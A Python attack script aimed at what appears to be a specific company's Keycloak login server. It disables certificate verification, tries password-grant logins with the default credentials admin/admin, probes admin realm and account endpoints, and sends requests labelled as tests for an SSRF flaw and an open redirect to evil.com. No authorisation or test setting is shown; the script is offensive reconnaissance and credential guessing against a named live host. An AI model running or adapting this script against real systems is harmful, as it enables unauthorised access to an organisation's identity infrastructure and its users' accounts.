import urllib.request
import ssl
import json
import sys

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

base = 'https://iamfw.home.oocllogistics.com'

# Check Keycloak version from favicon/fonts/resources
def check(path):
    url = base + path
    try:
        req = urllib.request.Request(url)
        resp = urllib.request.urlopen(req, timeout=10, context=ctx)
        body = resp.read()
        print(f'{path}: HTTP {resp.status}, {len(body)} bytes')
        return body
    except urllib.error.HTTPError as e:
        print(f'{path}: HTTP {e.code}')
        return None
    except Exception as e:
        print(f'{path}: {e}')
        return None

# Check list of realms (needs admin auth but let's try)
print("=== Testing Keycloak Admin API ===")
for path in ['/auth/realms', '/auth/admin/realms']:
    body = check(path)

print("\n=== Testing Keycloak Token Flow ===")
# Try to get a token via password grant with various approaches
token_url = base + '/auth/realms/master/protocol/openid-connect/token'

# Try client_credentials grant (sometimes clients have separate secrets)
for client_id, secret in [
    ('admin-cli', None),
    ('admin-cli', ''),
    ('security-admin-console', None),
]:
    params = {
        'client_id': client_id,
        'grant_type': 'password',
        'username': 'admin',
        'password': 'admin'
    }
    if secret is not None:
        params['client_secret'] = secret

    data = urllib.parse.urlencode(params).encode()
    req = urllib.request.Request(token_url, data=data)
    req.add_header('Content-Type', 'application/x-www-form-urlencoded')

    try:
        resp = urllib.request.urlopen(req, timeout=10, context=ctx)
        print(f'SUCCESS client={client_id}: {resp.read().decode()[:200]}')
    except urllib.error.HTTPError as e:
        body = e.read().decode()[:200]
        print(f'client={client_id}: HTTP {e.code} - {body}')
    except Exception as e:
        print(f'client={client_id}: {e}')

print("\n=== Testing for CVE-2023-0091 (SSRF) ===")
# CVE-2023-0091: SSRF in Keycloak via the "authorization" endpoint
# Test by fetching external URLs through the token exchange
for path in [
    '/auth/realms/master/protocol/openid-connect/token/exchange',
    '/auth/realms/master/protocol/openid-connect/ext/ciba/auth',
]:
    url = base + path
    try:
        req = urllib.request.Request(url, method='POST')
        req.add_header('Content-Type', 'application/json')
        resp = urllib.request.urlopen(req, timeout=10, context=ctx)
        print(f'{path}: HTTP {resp.status}')
    except urllib.error.HTTPError as e:
        print(f'{path}: HTTP {e.code}')
    except Exception as e:
        print(f'{path}: {e}')

print("\n=== Checking Known Endpoints ===")
# Check for common Keycloak endpoints
for path in [
    '/auth/realms/master/account',
    '/auth/realms/master/account/password',
    '/auth/realms/master/account/totp',
    '/auth/realms/master/account/identity',
    '/auth/realms/master/account/log',
    '/auth/realms/master/account/sessions',
    '/auth/realms/master/account/applications',
    '/auth/realms/master/account/reset-password',
]:
    body = check(path)

print("\n=== Testing CVE-2020-27838 (open redirect) ===")
# Check for open redirect
test_url = base + '/auth/realms/master/protocol/openid-connect/auth?client_id=security-admin-console&redirect_uri=https://evil.com'
try:
    req = urllib.request.Request(test_url)
    resp = urllib.request.urlopen(req, timeout=10, context=ctx)
    print(f'Open redirect test: HTTP {resp.status}')
    # Check if location header contains evil.com
    if resp.headers.get('Location') and 'evil.com' in resp.headers.get('Location'):
        print('OPEN REDIRECT FOUND!')
except urllib.error.HTTPError as e:
    print(f'Open redirect test: HTTP {e.code}')
    print(f'  Location: {e.headers.get("Location", "none")}')
except Exception as e:
    print(f'Open redirect test: {e}')
